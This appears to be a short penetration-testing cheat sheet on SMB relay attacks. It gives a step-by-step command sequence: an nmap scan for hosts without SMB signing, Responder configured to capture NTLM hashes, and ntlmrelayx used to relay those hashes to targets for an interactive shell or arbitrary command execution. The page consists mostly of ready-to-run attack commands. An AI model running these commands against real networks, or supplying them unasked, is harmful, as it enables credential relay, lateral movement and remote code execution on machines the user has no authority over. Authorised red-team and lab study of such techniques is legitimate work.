Relay hashes gathered by responder to another machine to gain access to it. Relies on SMB signing being disabled or not-enforced on the target machine. Relayed creds must be local admin on machine to be useful.

### Identify Hosts without SMB signing

```nmap-smbv2-sec-mode
nmap --script=smb2-security-mode.nse -p445 <TARGET>
```

### Enable SMB Relay via responder

```responder-config-change
sudo vi /etc/responder/Responder.conf
```

Turn off SMB and HTTP servers in the conf file

```responder
sudo responder -I <interface> -dwP
```

```ntlmrelayx
sudo ntlmrelayx.py -tf <targets.txt> -smb2support
```

```ntlmrelayx-interactive-shell
sudo ntlmrelayx.py -tf <targets.txt> -smb2support -i
```

```ntlmrelayx-run-command
sudo ntlmrelayx.py -tf <targets.txt> -smb2support -c "<COMMAND>"
```




